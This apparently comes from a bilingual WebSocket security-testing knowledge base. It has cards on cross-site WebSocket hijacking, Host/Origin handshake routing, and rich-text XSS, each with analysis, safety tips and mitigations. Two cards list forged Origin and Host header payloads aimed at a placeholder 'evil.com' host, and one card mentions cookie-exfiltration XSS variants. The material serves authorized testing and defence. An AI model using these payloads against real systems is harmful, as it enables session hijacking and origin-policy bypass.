description.zh: WS跨站劫持 (CSWSH) - Origin绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Origin Validation for Cross-Site Web Socket Hijacking validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: `Origin: null` 可能来自 sandbox/file 环境但不应默认信任；相似域、编码斜杠、反斜杠、端口和空 Origin 用于发现错误字符串匹配。只有浏览器可产生的恶意 Origin 在携带测试会话时获授权才是 CSWSH，手工客户端可设置任意头会产生假阳性。
analysis.en: `Origin: null` can arise from sandbox or file contexts but should not be trusted by default. Lookalike domains, encoded slashes, backslashes, ports, and empty Origin probe flawed string matching. CSWSH requires a browser-producible hostile Origin to gain authorization with the test session; arbitrary headers from a manual client create false positives.

opsecTips.zh: 跨站页面首次读取一项无敏感标记后停止，不发送状态修改消息、导出聊天记录或使用他人会话。
opsecTips.en: Stop after the cross-site page reads one nonsensitive marker and do not send state-changing messages, export chat history, or use another user's session.

opsecTips.zh: 注销测试会话，关闭两端 WebSocket，删除跨站页面与消息，清理 Cookie、站点数据和握手日志中的令牌。
opsecTips.en: Log out the test session, close both sockets, delete the cross-site page and messages, and clear cookies, site data, and tokens from handshake logs.

title.zh: 确认CSWSH Origin 校验前置条件

description.zh: 20 行是手工 Origin 解析变体；浏览器脚本不能任意设置 Origin，因此测试需区分代理重放与真实跨站浏览器条件。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The 20 lines are manual Origin parser variants; browser script cannot arbitrarily set Origin, so proxy replay must be distinguished from a real cross-site browser condition. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控CSWSH Origin 校验对照
title.en: Run a controlled CSWSH Origin Validation comparison

description.zh: 先从真实跨站页面发起握手，观察浏览器 Origin；仅在解析单元测试中逐个使用 null、端口、编码和相似域变体。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Initiate a handshake from a real cross-site page and observe the browser Origin, using null, port, encoding, and lookalike variants only in parser-focused tests. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

attackChain.payload:
Origin: null
Origin: https://target.com.evil.com
Origin: https://evil.com%09target.com
Origin: https://evil.com%00target.com
Origin: https://evil.com%0d%0atarget.com
Origin: https://evil.com.target.com
Origin: https://target.com:443
Origin: https://target.com:8080
Origin: https://target.com:8443
Origin: https://target.com/
Origin: https://target.com%2f
Origin: https://target.com%252f
Origin: https://target.com%23evil.com
Origin: https://target.com#evil.com
Origin: https://target.com\evil.com
Origin: https://target.com%5cevil.com
Origin: http://target.com
Origin: ws://target.com
Origin: wss://target.com
Origin:

title.zh: 核对CSWSH Origin 校验阳性边界
title.en: Verify CSWSH Origin Validation positive boundaries

description.zh: 阳性要求跨站浏览器连接被接受、会话身份有效且可执行/读取一项受控授权操作；101 响应或变造 Origin 被代理接受不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: 阳性要求跨站浏览器连接被接受、会话身份有效且可执行/读取一项受控授权操作；101 响应或变造 Origin 被代理接受不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。

title.zh: 修复并回归CSWSH Origin 校验
title.en: Remediate and regress CSWSH Origin Validation

description.zh: 对规范化后的 scheme/host/port 做精确 Origin 允许列表，拒绝 null/缺失来源，使用 SameSite/CSRF 设计与消息级授权。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Use an exact allowlist over canonical scheme, host, and port, reject null or absent origins, and combine SameSite or CSRF design with message-level authorization. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: 跨站 WebSocket 劫持的 Origin 校验聚焦20 行是手工 Origin 解析变体；浏览器脚本不能任意设置 Origin，因此测试需区分代理重放与真实跨站浏览器条件。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Origin Validation for Cross-Site Web Socket Hijacking focuses on this boundary: The 20 lines are manual Origin parser variants; browser script cannot arbitrarily set Origin, so proxy replay must be distinguished from a real cross-site browser condition. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 服务器依赖 Cookie 认证却不验证 Origin 或用后缀/子串错误匹配，攻击者页面可借受害者会话打开连接。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: The server relies on cookie authentication without validating Origin or uses flawed suffix or substring matching, allowing an attacker page to open a socket with the victim session. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 先从真实跨站页面发起握手，观察浏览器 Origin；仅在解析单元测试中逐个使用 null、端口、编码和相似域变体。 阳性要求跨站浏览器连接被接受、会话身份有效且可执行/读取一项受控授权操作；101 响应或变造 Origin 被代理接受不够。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: 先从真实跨站页面发起握手，观察浏览器 Origin；仅在解析单元测试中逐个使用 null、端口、编码和相似域变体。 阳性要求跨站浏览器连接被接受、会话身份有效且可执行/读取一项受控授权操作；101 响应或变造 Origin 被代理接受不够。 关联浏览器 Dev Tools、握手/消息日志和后端审计，形成明确阳性与阴性对照。

mitigation.zh: 对规范化后的 scheme/host/port 做精确 Origin 允许列表，拒绝 null/缺失来源，使用 SameSite/CSRF 设计与消息级授权。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Use an exact allowlist over canonical scheme, host, and port, reject null or absent origins, and combine SameSite or CSRF design with message-level authorization. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: WebSocket 握手 Host 与 Origin 路由校验
name.en: Web Socket Handshake Host and Origin Routing Validation

description.zh: 测试握手阶段 Host、标准 Origin 与旧式 Sec-WebSocket-Origin 的解析和路由边界，验证虚拟主机与来源策略是否一致。
description.en: Tests parsing and routing boundaries for Host, standard Origin, and legacy Sec-Web Socket-Origin during the handshake to validate virtual-host and origin policy consistency.

prerequisites.zh: 已记录反向代理、负载均衡器和应用各自处理 Host/Origin 的规则与允许端口。
prerequisites.en: Record how the reverse proxy, load balancer, and application process Host and Origin and which ports are allowed.

prerequisites.zh: 使用受控虚拟主机和测试账号，可关联外层 HTTP Upgrade 与最终 WebSocket 服务实例。
prerequisites.en: Use a controlled virtual host and test account and correlate the outer HTTP Upgrade with the final Web Socket service instance.

title.zh: WS握手阶段Host/Origin绕过
title.en: Validation step 1 for Web Socket Handshake Host and Origin Routing Validation

execution.command:
Host: target.com:443
Host: target.com:80
Host: target.com:8080
Host: target.com.evil.com
Host: null
Sec-WebSocket-Origin: https://evil.com
Sec-WebSocket-Origin: null
Sec-WebSocket-Origin: https://target.com.evil.com

description.zh: WS握手阶段Host/Origin绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Web Socket Handshake Host and Origin Routing Validation validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: Host 控制连接路由，Origin 表示脚本来源；`Sec-WebSocket-Origin` 来自早期草案且不应作为现代安全信号。手工客户端可以伪造这些头，所以只有跨层解析差异导致错误服务和权限才是阳性；单一头被接受或端口响应不同是假阳性。
analysis.en: Host controls connection routing while Origin represents script origin; `Sec-Web Socket-Origin` is from an early draft and should not be a modern security signal. Manual clients can forge these headers, so only cross-layer parsing that reaches the wrong service and privilege is positive; acceptance of one header or different port responses is false positive.

opsecTips.zh: 首次确认路由到受控错误虚拟主机后停止，不连接生产后台、管理端口或其他租户。
opsecTips.en: Stop after the first controlled misrouting to a test virtual host and do not connect to production backends, management ports, or other tenants.

opsecTips.zh: 关闭测试套接字，恢复代理 Host 映射和证书配置，删除握手样例并清空连接池。
opsecTips.en: Close test sockets, restore proxy Host mappings and certificate configuration, delete handshake samples, and drain connection pools.

title.zh: 确认WebSocket 握手路由前置条件
title.en: Confirm Web Socket Handshake Routing prerequisites

description.zh: 八行混合 Host 与已废弃草案头 Sec-WebSocket-Origin；RFC 6455 浏览器使用标准 Origin，二者不能互相替代。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The eight lines mix Host with the legacy draft header Sec-Web Socket-Origin; RFC 6455 browsers use standard Origin, so the headers are not interchangeable. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控WebSocket 握手路由对照
title.en: Run a controlled Web Socket Handshake Routing comparison

description.zh: 对真实浏览器握手记录标准头，再由协议客户端分别改变 Host 和旧式头，一次只修改一个字段并核对路由目标。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Record standard headers from a real browser handshake, then change Host and the legacy header separately with a protocol client while checking the routed destination. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

attackChain.payload:
Host: target.com:443
Host: target.com:80
Host: target.com:8080
Host: target.com.evil.com
Host: null
Sec-WebSocket-Origin: https://evil.com
Sec-WebSocket-Origin: null
Sec-WebSocket-Origin: https://target.com.evil.com

title.zh: 核对WebSocket 握手路由阳性边界
title.en: Verify Web Socket Handshake Routing positive boundaries

description.zh: 阳性要求请求被路由到非预期服务且获得不应有的会话/消息权限；101、不同证书错误或旧头被忽略都不足。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: Positive evidence requires routing to an unintended service with unauthorized session or message capability; a 101 response, certificate error difference, or ignored legacy header is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归WebSocket 握手路由
title.en: Remediate and regress Web Socket Handshake Routing

description.zh: 代理和应用使用一致的规范 Host/Origin 允许列表，绑定 Upgrade 到预期虚拟主机，忽略旧式头并在消息层重新授权。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Use consistent canonical Host and Origin allowlists across proxy and application, bind Upgrade to the intended virtual host, ignore legacy headers, and authorize again at message level. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: WebSocket 握手 Host 与 Origin 路由校验聚焦八行混合 Host 与已废弃草案头 Sec-WebSocket-Origin；RFC 6455 浏览器使用标准 Origin，二者不能互相替代。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Web Socket Handshake Host and Origin Routing Validation focuses on this boundary: The eight lines mix Host with the legacy draft header Sec-Web Socket-Origin; RFC 6455 browsers use standard Origin, so the headers are not interchangeable. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 代理按 Host 路由而应用按另一头校验，或服务信任客户端可伪造的旧式头，可能造成跨虚拟主机连接与策略绕过。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: A proxy may route by Host while the application validates another header, or a service may trust a forgeable legacy header, causing cross-virtual-host connections and policy bypass. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 对真实浏览器握手记录标准头，再由协议客户端分别改变 Host 和旧式头，一次只修改一个字段并核对路由目标。 阳性要求请求被路由到非预期服务且获得不应有的会话/消息权限；101、不同证书错误或旧头被忽略都不足。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Record standard headers from a real browser handshake, then change Host and the legacy header separately with a protocol client while checking the routed destination. Positive evidence requires routing to an unintended service with unauthorized session or message capability; a 101 response, certificate error difference, or ignored legacy header is insufficient. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 代理和应用使用一致的规范 Host/Origin 允许列表，绑定 Upgrade 到预期虚拟主机，忽略旧式头并在消息层重新授权。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Use consistent canonical Host and Origin allowlists across proxy and application, bind Upgrade to the intended virtual host, ignore legacy headers, and authorize again at message level. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: WebSocket 富文本 XSS 上下文探针
name.en: Web Socket Rich-Text XSS Context Probes

description.zh: 覆盖 chat/send/message/data 信封、交互事件、SVG/data URL 与高风险外传样例，验证 WebSocket 富文本在不同 DOM 上下文的编码。
description.en: Covers chat, send, message, and data envelopes plus interactive events, SVG, data UR Ls, and high-risk exfiltration samples to test context-specific encoding of Web Socket rich text.

subCategory.zh: WebSocket 富文本上下文 XSS

prerequisites.zh: 已识别实际支持的消息 schema 与最终 HTML、属性、URL 或 SVG sink，其他信封仅作为负对照。
prerequisites.en: Identify the supported message schema and final HTML, attribute, URL, or SVG sink; treat unsupported envelopes as negative controls.

prerequisites.zh: 隔离账号和浏览器禁止外部网络，所有 alert/fetch/sendBeacon 原始动作改为本地无害执行标记。
prerequisites.en: Use an isolated account and networkless browser and replace source alert, fetch, and send Beacon actions with a harmless local execution marker.

title.zh: WS消息注入 (XSS via WebSocket)
title.en: Validation step 1 for Web Socket Rich-Text XSS Context Probes

description.zh: WS消息注入 (XSS via WebSocket)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Web Socket Rich-Text XSS Context Probes validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 该集合含明显高风险 Cookie 外传与 data/SVG 变体，验证不需要实际外传。消息被广播或存储只是到达条件；必须在特定接收端 sink 中执行无害标记。被 CSP 阻止、DOMPurify 删除、客户端显示转义文本或只有发送者自我执行均是假阳性/影响边界。
analysis.en: The set contains high-risk cookie-exfiltration and data or SVG variants, but validation never requires exfiltration. Broadcast or storage is only reachability; a harmless marker must execute in the specific receiving sink. CSP blocking, sanitizer removal, escaped rendering, or sender-only self-execution defines false-positive or impact boundaries.

opsecTips.zh: 一个接收端上下文执行本地标记后停止，不使用原始 Cookie 外传、sendBeacon、data URL 或跨用户批量消息。
opsecTips.en: Stop after one receiver context executes the local marker; do not use source cookie exfiltration, send Beacon, data UR Ls, or cross-user bulk messages.

opsecTips.zh: 删除所有测试消息和附件，清理接收端浏览器存储/service worker，关闭连接并检查持久队列不再广播。
opsecTips.en: Delete all test messages and attachments, clear receiver storage and service workers, close connections, and verify persistent queues no longer broadcast them.

title.zh: 确认WebSocket 富文本上下文 XSS前置条件
title.en: Confirm Web Socket Rich-Text Context XSS prerequisites

description.zh: 24 行比基础 WebSocket XSS 卡增加链接/交互/SVG/data 与 Cookie 外传形式，必须按最终输出上下文选择，不能批量投递。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: The 24 lines add links, interaction events, SVG, data UR Ls, and cookie-exfiltration forms beyond basic Web Socket XSS and must be selected by final output context rather than sent in bulk. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控WebSocket 富文本上下文 XSS对照
title.en: Run a controlled Web Socket Rich-Text Context XSS comparison

description.zh: 先用纯文本定位上下文，只选择一个无网络标记变体并与消毒/编码对照，分别观察发送端和接收端。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Locate the context with plaintext, select one networkless marker variant with a sanitized or encoded control, and observe sender and receiver separately. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

title.zh: 核对WebSocket 富文本上下文 XSS阳性边界
title.en: Verify Web Socket Rich-Text Context XSS positive boundaries

description.zh: 阳性是接收浏览器在对应 sink 执行本地标记；Cookie URL 出现在日志、CSP 阻断报告、HTML 被显示为文本或外部请求失败都不是成功。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: Positive evidence is local marker execution in the matching sink on the receiving browser; cookie URLs in logs, CSP reports, HTML shown as text, or failed external requests are not success. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归WebSocket 富文本上下文 XSS
title.en: Remediate and regress Web Socket Rich-Text Context XSS

description.zh: 对每个字段执行 context-aware 编码，富文本采用严格允许列表消毒，拒绝 javascript/data 协议并部署无 unsafe-inline 的 CSP。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Apply context-aware encoding per field, sanitize rich text with a strict allowlist, reject javascript and data schemes, and deploy CSP without unsafe-inline. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: WebSocket 富文本 XSS 上下文探针聚焦24 行比基础 WebSocket XSS 卡增加链接/交互/SVG/data 与 Cookie 外传形式，必须按最终输出上下文选择，不能批量投递。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Web Socket Rich-Text XSS Context Probes focuses on this boundary: The 24 lines add links, interaction events, SVG, data UR Ls, and cookie-exfiltration forms beyond basic Web Socket XSS and must be selected by final output context rather than sent in bulk. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 消息在存储、广播或客户端重放时进入与其编码不匹配的富文本 sink，允许事件属性、危险 URL 或 SVG 脚本执行。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: Messages enter a rich-text sink with mismatched encoding during storage, broadcast, or client replay, allowing event attributes, dangerous URLs, or SVG script execution. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 先用纯文本定位上下文，只选择一个无网络标记变体并与消毒/编码对照，分别观察发送端和接收端。 阳性是接收浏览器在对应 sink 执行本地标记；Cookie URL 出现在日志、CSP 阻断报告、HTML 被显示为文本或外部请求失败都不是成功。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Locate the context with plaintext, select one networkless marker variant with a sanitized or encoded control, and observe sender and receiver separately. Positive evidence is local marker execution in the matching sink on the receiving browser; cookie UR Ls in logs, CSP reports, HTML shown as text, or failed external requests are not success. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 对每个字段执行 context-aware 编码，富文本采用严格允许列表消毒，拒绝 javascript/data 协议并部署无 unsafe-inline 的 CSP。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Apply context-aware encoding per field, sanitize rich text with a strict allowlist, reject javascript and data schemes, and deploy CSP without unsafe-inline.
